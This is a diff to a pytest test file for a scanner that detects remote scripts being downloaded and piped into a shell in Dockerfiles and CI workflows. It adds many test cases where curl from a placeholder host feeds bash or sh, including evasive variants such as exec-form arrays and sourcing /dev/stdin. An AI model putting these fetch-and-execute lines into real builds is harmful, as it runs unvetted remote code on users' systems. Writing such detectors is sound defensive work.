@@ -252,10 +252,69 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
         pytest.param(
             "RUN curl -sSL https://x.example/i.sh | sh -c 'bash'\n", id="dash-c-runs-a-shell"
         ),
-        # `-s` makes the shell read its program from stdin -- the piped download -- so it wins
-        # over the `-c` operand rather than deferring to it.
+        # Dockerfile EXEC form. Docker runs the array as argv with no shell of its own, but here
+        # argv[0] IS a shell and argv[2] is the command it runs, so the download is executed just
+        # as in the shell form. The JSON quoting is FILE syntax; leaving it on made the whole
+        # command arrive as one token with no pipeline visible inside it.
         pytest.param(
-            "RUN curl -sSL https://x.example/i.sh | bash -s -c 'jq .'\n", id="dash-s-beats-dash-c"
+            'RUN ["bash", "-c", "curl -sSL https://x.example/i.sh | bash"]\n',
+            id="exec-form-run",
+        ),
+        pytest.param(
+            'RUN ["/bin/sh", "-c", "curl -sSL https://x.example/i.sh | sh"]\n',
+            id="exec-form-absolute-path",
+        ),
+        pytest.param(
+            'ENTRYPOINT ["bash", "-c", "curl -sSL https://x.example/i.sh | bash"]\n',
+            id="exec-form-entrypoint",
+        ),
+        pytest.param(
+            'CMD ["sh", "-c", "curl -sSL https://x.example/i.sh | sh"]\n', id="exec-form-cmd"
+        ),
+        # A workflow `run:` value may be a QUOTED scalar rather than a bare or block one. The
+        # quotes are YAML syntax, so they come off at the same boundary as the keyword.
+        pytest.param('run: "curl -sSL https://x.example/i.sh | bash"\n', id="quoted-scalar-double"),
+        pytest.param("run: 'curl -sSL https://x.example/i.sh | bash'\n", id="quoted-scalar-single"),
+        # `source` and `.` are BUILTINS, so no shell name appears as a command word anywhere in
+        # the stage -- yet sourcing stdin reads the piped download and runs it. Each spelling was
+        # confirmed by running it, not inferred from /dev/stdin:
+        #   printf 'echo PWNED\n' | bash -c 'source /dev/stdin'       -> PWNED
+        #   printf 'echo PWNED\n' | bash -c '. /dev/stdin'            -> PWNED
+        #   printf 'echo PWNED\n' | bash -c 'source /dev/fd/0'        -> PWNED
+        #   printf 'echo PWNED\n' | bash -c 'source /proc/self/fd/0'  -> PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c 'source /dev/stdin'\n",
+            id="source-stdin",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c '. /dev/stdin'\n", id="dot-stdin"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | sh -c '. /dev/stdin'\n", id="sh-dot-stdin"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c 'source /dev/fd/0'\n",
+            id="source-dev-fd-zero",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c 'source /proc/self/fd/0'\n",
+            id="source-proc-self-fd-zero",
+        ),
+        # The operand is a command LIST, so the source need not be the first command in it.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c 'true; source /dev/stdin'\n",
+            id="source-stdin-second-command",
+        ),
+        # `-s` alongside `-c` is SHELL-DEPENDENT, and this case pins the shell where it executes.
+        # Confirmed by running both, rather than reasoning from the flags:
+        #   printf 'echo PWNED\n' | sh   -s -c 'echo RAN_C'  ->  RAN_C then PWNED  <-- executed
+        #   printf 'echo PWNED\n' | bash -s -c 'echo RAN_C'  ->  RAN_C only
+        # `/bin/sh` is dash on Debian and Ubuntu, which is where a Dockerfile RUN lands, so this
+        # spelling really does execute the download. The bash spelling is a legitimate one and is
+        # pinned as a counter-case below; an earlier version of this test asserted the bash form
+        # was dangerous, which is the opposite of what bash does.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | sh -s -c 'jq .'\n", id="dash-s-beats-dash-c"
         ),
         # A MULTI-WORD `-c` body. The operand is re-tokenized and walked like any other stage, so
         # the shell is found behind whatever precedes it -- judging the body by its first word
@@ -422,6 +481,41 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         # `-s`/`-i` start a shell only when NOTHING follows them. With a command present, sudo
         # runs THAT and the stream is never executed -- so the flag alone cannot be the signal.
         # Confirmed: printf 'echo X\n' | sudo -n -s echo hi   ->   hi
+        # An exec-form array that runs no shell rejoins into a stage whose command word is not a
+        # shell, so it stays clean for the same reason its shell-form spelling would. Unwrapping
+        # the JSON must not by itself make an array suspicious.
+        pytest.param('RUN ["python", "-m", "pip", "install", "x"]', id="exec-form-no-shell"),
+        pytest.param('CMD ["uvicorn", "app:main", "--host", "0.0.0.0"]', id="exec-form-server"),
+        pytest.param(
+            'RUN ["bash", "-c", "curl -sSL https://x.example/f | jq ."]', id="exec-form-into-jq"
+        ),
+        pytest.param('run: "curl -sSL https://x.example/f | jq ."', id="quoted-scalar-into-jq"),
+        pytest.param('run: "make test"', id="quoted-scalar-no-fetch"),
+        # A command may itself START and END with a quote without being a quoted scalar: the
+        # quotes here belong to the URL argument, and stripping them would splice the URL onto
+        # the shell name. Only a quote enclosing the WHOLE value is file syntax.
+        pytest.param("curl -s 'https://x.example/a|b' | jq .", id="quoted-arg-is-not-a-scalar"),
+        # The other half of the shell-dependent `-s -c` pair pinned in the matching test above.
+        # bash and busybox ash run the `-c` program and leave the pipe as unread data; only dash
+        # goes on to execute it. Verified: printf 'echo PWNED\n' | bash -s -c 'echo RAN_C'
+        # prints RAN_C and no PWNED.
+        pytest.param(
+            "curl -sSL https://x.example/i.sh | bash -s -c 'jq .'", id="bash-s-c-is-clean"
+        ),
+        # Sourcing an ordinary FILE runs that file and leaves the pipe unread, and a command that
+        # merely reads stdin as data is not executing it. Confirmed:
+        #   printf 'echo PWNED\n' | bash -c 'source ./sf.sh'  ->  FROM_FILE, no PWNED
+        # Without the stdin-path check, matching bare `source` would flag all of these.
+        pytest.param(
+            "curl -s https://x.example/i.sh | bash -c 'source ./setup.sh'", id="source-a-real-file"
+        ),
+        pytest.param("curl -s https://x.example/i.sh | bash -c '. ./env.sh'", id="dot-a-real-file"),
+        pytest.param(
+            "curl -s https://x.example/i.sh | bash -c 'cat /dev/stdin'", id="cat-stdin-is-data"
+        ),
+        # `source` as a search term or a JSON field is not a command being run.
+        pytest.param("curl -s https://x.example/f | grep source", id="grep-for-source"),
+        pytest.param("curl -s https://x.example/f | jq -r .source", id="jq-source-field"),
         pytest.param("curl -s https://x.example/f | sudo -s echo hi", id="sudo-s-with-a-command"),
         pytest.param("curl -s https://x.example/f | sudo -s jq .", id="sudo-s-into-jq"),
         # `-s` on a wrapper that is not a privilege tool means something else entirely (here, the
